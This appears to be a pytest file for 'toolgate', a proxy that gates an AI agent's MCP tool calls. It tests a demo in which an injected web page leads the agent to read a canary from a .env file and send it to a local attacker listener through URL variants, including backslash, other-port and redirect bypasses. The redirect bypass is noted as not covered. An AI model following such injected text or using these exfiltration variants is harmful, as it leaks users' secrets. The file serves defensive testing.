"""Tests for the cross-server exfiltration demo's fixtures (T9, part 1).

Three layers, kept apart on purpose:

1. The fixtures themselves (HTTP servers, client helpers) behave as the demo
   assumes. Pure, fast, no external commands.
2. The demo policies load, expand and classify, and `evaluate_tool_call`
   refuses the scripted exfiltration URLs while allowing the page. This is
   POLICY-LEVEL evidence: it shows what the rules say, not that a proxy
   enforces them. The proxy proof is the T9 E2E, which reuses the same
   scenario with each server behind `toolgate wrap`.
3. `live_servers`: the pinned real servers, started via npx/uvx. These record
   the toolgate-OFF run -- every variant leaks the canary -- before any proxy
   code exists, so the "on" run later has a measured counterfactual rather
   than an assumed one. They also check every real tool schema is classified
   by the demo policy.

Layer 3 runs in CI by default: the ubuntu runner has node/npx and the
workflow installs uv (so uvx), and the demo is the v0.1 acceptance test, so
it must not be something CI quietly skips. It skips only where npx or uvx is
absent. It needs network access to install the pinned packages on first use.
"""

from __future__ import annotations

import shutil
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

import pytest
import yaml

from tests.fixtures.demo import (
    CANARY,
    CANARY_LINE,
    DOCUMENTED_PAGE_PORT,
    FETCH_COMMAND,
    FILESYSTEM_COMMAND,
    PROJECT_DIR,
)
from tests.fixtures.demo.http_fixtures import (
    AttackerListener,
    PageServer,
    free_port,
    injection_text,
)
from tests.fixtures.demo.mcp_client import is_tool_error, result_text
from tests.fixtures.demo.scenario import VARIANTS, variant_url
from toolgate.gating.policy import PolicyConfig, load_policy_config
from toolgate.gating.tool_calls import (
    ToolCallPolicy,
    ToolDecision,
    evaluate_tool_call,
    expand_placeholders,
    resolve_sandbox,
    unclassified_arguments,
)

REPO = Path(__file__).resolve().parent.parent
DEMO = REPO / "demo"

#: `mcp-server-fetch==2026.8.18`'s declared schema, as probed on 2026-10-03.
FETCH_SCHEMA = {
    "type": "object",
    "properties": {
        "url": {"type": "string", "format": "uri", "minLength": 1},
        "max_length": {"type": "integer"},
        "start_index": {"type": "integer", "minimum": 0},
        "raw": {"type": "boolean"},
    },
    "required": ["url"],
}


def _get(url: str) -> tuple[int, dict[str, str], str]:
    request = urllib.request.Request(url)

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *args: Any, **kwargs: Any) -> None:
            return None

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=10) as response:
            return response.status, dict(response.headers), response.read().decode()
    except urllib.error.HTTPError as error:
        return error.code, dict(error.headers), error.read().decode()


# --- layer 1: the fixtures ------------------------------------------------------


class TestFixtureServers:
    def test_free_port_is_free_on_both_stacks(self) -> None:
        port = free_port()
        with PageServer(port, attacker_port=free_port()):
            pass  # binding 127.0.0.1 and ::1 on it raised nothing

    def test_page_is_served_on_both_stacks_with_the_injection(self) -> None:
        port, attacker = free_port(), free_port()
        with PageServer(port, attacker) as page:
            for host in ("127.0.0.1", "[::1]"):
                status, _, body = _get(f"http://{host}:{port}/page")
                assert status == 200
                assert injection_text(attacker) in body
            assert {r.bound for r in page.requests} == {"127.0.0.1", "::1"}

    def test_robots_txt_is_404_so_the_fetch_server_proceeds(self) -> None:
        port = free_port()
        with PageServer(port, free_port()):
            assert _get(f"http://127.0.0.1:{port}/robots.txt")[0] == 404

    def test_redirect_points_at_the_listener_with_the_query(self) -> None:
        port, attacker = free_port(), free_port()
        with PageServer(port, attacker):
            status, headers, _ = _get(f"http://127.0.0.1:{port}/redirect?d=abc")
        assert status == 302
        assert headers["Location"] == f"http://127.0.0.1:{attacker}/?d=abc"

    def test_listener_records_decoded_targets_and_ignores_robots(self) -> None:
        port = free_port()
        with AttackerListener(port) as listener:
            _get(f"http://127.0.0.1:{port}/robots.txt?d={CANARY}")
            assert not listener.received(CANARY)
            _get(f"http://127.0.0.1:{port}/?d=TOOLGATE_CANARY%3D{CANARY}")
            assert listener.received(CANARY_LINE)
            listener.clear()
            assert listener.requests == []

    def test_listener_binds_ipv4_only(self) -> None:
        port = free_port()
        with AttackerListener(port), pytest.raises(urllib.error.URLError):
            urllib.request.urlopen(f"http://[::1]:{port}/", timeout=5)

    def test_reply_helpers(self) -> None:
        ok = {"result": {"content": [{"type": "text", "text": "a"}, {"type": "image"}]}}
        assert result_text(ok) == "a"
        assert not is_tool_error(ok)
        assert is_tool_error({"result": {"isError": True, "content": []}})
        assert is_tool_error({"error": {"code": -32600, "message": "x"}})

    def test_variant_urls_carry_the_data_url_encoded(self) -> None:
        for variant in VARIANTS:
            url = variant_url(variant, page_port=1000, attacker_port=2000, data=CANARY_LINE + "\n")
            assert "TOOLGATE_CANARY%3D" in url and "%0A" in url
        with pytest.raises(ValueError):
            variant_url("nope", page_port=1, attacker_port=2, data="")

    def test_canary_file_holds_exactly_the_canary(self) -> None:
        assert (PROJECT_DIR / ".env").read_text(encoding="utf-8").strip() == CANARY_LINE

    def test_demo_commands_match_the_pinned_servers(self) -> None:
        servers = yaml.safe_load((REPO / "config" / "servers.yaml").read_text(encoding="utf-8"))
        fs = servers["servers"]["filesystem"]
        fetch = servers["servers"]["fetch"]
        assert list(FILESYSTEM_COMMAND) == [fs["command"], *fs["args"][:-1], "{project}"]
        assert list(FETCH_COMMAND) == [fetch["command"], *fetch["args"]]


# --- layer 2: the demo policies ---------------------------------------------------


def _load(name: str) -> PolicyConfig:
    return load_policy_config(DEMO / name)


def _expanded(config: PolicyConfig, config_dir: Path = DEMO) -> ToolCallPolicy:
    sandbox = (
        resolve_sandbox(config.sandbox, base_dir=config_dir, environ={}, home=Path.home())
        if config.sandbox
        else None
    )
    return expand_placeholders(config.tool_calls, sandbox=sandbox, environ={}, home=Path.home())


def fetch_policy_for(page_port: int) -> ToolCallPolicy:
    """`demo/fetch.yaml` with the documented page port swapped for a real one."""
    text = (DEMO / "fetch.yaml").read_text(encoding="utf-8")
    raw = yaml.safe_load(
        text.replace(f"localhost:{DOCUMENTED_PAGE_PORT}", f"localhost:{page_port}")
    )
    from toolgate.gating.tool_calls import load_tool_call_policy

    return load_tool_call_policy(raw["tool_calls"])


class TestDemoPolicies:
    def test_filesystem_policy_loads_and_its_sandbox_is_the_demo_project(self) -> None:
        config = _load("filesystem.yaml")
        assert config.sandbox is not None
        sandbox = resolve_sandbox(config.sandbox, base_dir=DEMO, environ={}, home=Path.home())
        assert sandbox == PROJECT_DIR.resolve()
        assert config.redaction_detectors == frozenset()  # the read carries the canary
        assert config.tool_calls.default is ToolDecision.BLOCK

    def test_fetch_policy_loads_with_redaction_on_and_one_egress_rule(self) -> None:
        config = _load("fetch.yaml")
        assert config.redaction_detectors == frozenset({"pii"})
        assert config.tool_calls.rules["fetch.fetch"].egress == (
            f"localhost:{DOCUMENTED_PAGE_PORT}",
        )
        assert config.tool_calls.default is ToolDecision.BLOCK

    def test_the_canary_read_is_allowed_and_an_escape_is_not(self) -> None:
        policy = _expanded(_load("filesystem.yaml"))
        schema = {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "head": {"type": "number"},
                "tail": {"type": "number"},
            },
        }
        read = evaluate_tool_call(
            policy,
            "filesystem",
            "read_text_file",
            {"path": str(PROJECT_DIR / ".env")},
            schema=schema,
        )
        escape = evaluate_tool_call(
            policy,
            "filesystem",
            "read_text_file",
            {"path": str(PROJECT_DIR.parent / "x")},
            schema=schema,
        )
        assert read.decision is ToolDecision.ALLOW
        assert escape.decision is ToolDecision.BLOCK

    def test_the_scripted_urls_get_the_verdicts_the_demo_claims(self) -> None:
        """Policy-level only: what the rule says about each scripted URL."""
        page, attacker = 49001, 49002
        policy = fetch_policy_for(page)

        def verdict(url: str) -> ToolDecision:
            return evaluate_tool_call(
                policy, "fetch", "fetch", {"url": url}, schema=FETCH_SCHEMA
            ).decision

        assert verdict(f"http://localhost:{page}/page") is ToolDecision.ALLOW
        expected = {
            "exfil": ToolDecision.BLOCK,
            "backslash": ToolDecision.BLOCK,
            "other_port": ToolDecision.BLOCK,
            # The URL itself is allowed; the server's own redirect is the leak.
            # Not covered by toolgate, and shown rather than hidden.
            "redirect": ToolDecision.ALLOW,
        }
        for variant, decision in expected.items():
            url = variant_url(variant, page_port=page, attacker_port=attacker, data=CANARY_LINE)
            assert verdict(url) is decision, variant


# --- layer 3: the real servers, toolgate off ---------------------------------------

needs_servers = pytest.mark.skipif(
    shutil.which("npx") is None or shutil.which("uvx") is None,
    reason="npx and uvx are needed to start the pinned reference servers",
)


@pytest.mark.live_servers
@needs_servers
def test_every_real_tool_is_named_and_classified_by_the_demo_policies() -> None:
    """A server upgrade that adds a tool or an argument fails here, not in a demo."""
    from tests.fixtures.demo.mcp_client import StdioMcpClient
    from tests.fixtures.demo.scenario import _fill

    for name, command in (("filesystem", FILESYSTEM_COMMAND), ("fetch", FETCH_COMMAND)):
        policy = _expanded(_load(f"{name}.yaml"))
        with StdioMcpClient(_fill(command, DOCUMENTED_PAGE_PORT)) as client:
            client.initialize()
            tools = client.list_tools()
        assert tools, name
        for tool in tools:
            key = f"{name}.{tool['name']}"
            assert key in policy.rules, f"{key} has no rule (default is block)"
            assert unclassified_arguments(policy.rules[key], tool["inputSchema"]) == (), key


@pytest.mark.live_servers
@needs_servers
def test_toolgate_off_every_variant_leaks_the_canary() -> None:
    """The recorded counterfactual (design claim 1, "toolgate removed").

    First recorded on 2026-10-03 on the Windows dev machine, before any proxy
    code existed: the read returned the canary verbatim, the control fetch
    succeeded, and the listener received the canary for all four variants --
    including `backslash` (the fetch server connected to the attacker host)
    and `other_port`. If any of these stops leaking with toolgate off, the
    "on" run's refusals stop meaning anything, so this test fails loudly.
    """
    from tests.fixtures.demo.scenario import run_scenario

    result = run_scenario()
    assert result.read_has_canary, result.read_text
    assert result.read_text.strip() == CANARY_LINE
    assert result.control_ok, (result.control_head, result.noise)
    outcomes = result.by_variant()
    assert set(outcomes) == set(VARIANTS)
    for variant, outcome in outcomes.items():
        assert not outcome.refused, (variant, outcome.reply_head)
        assert outcome.canary_at_listener, (variant, outcome.listener_targets)
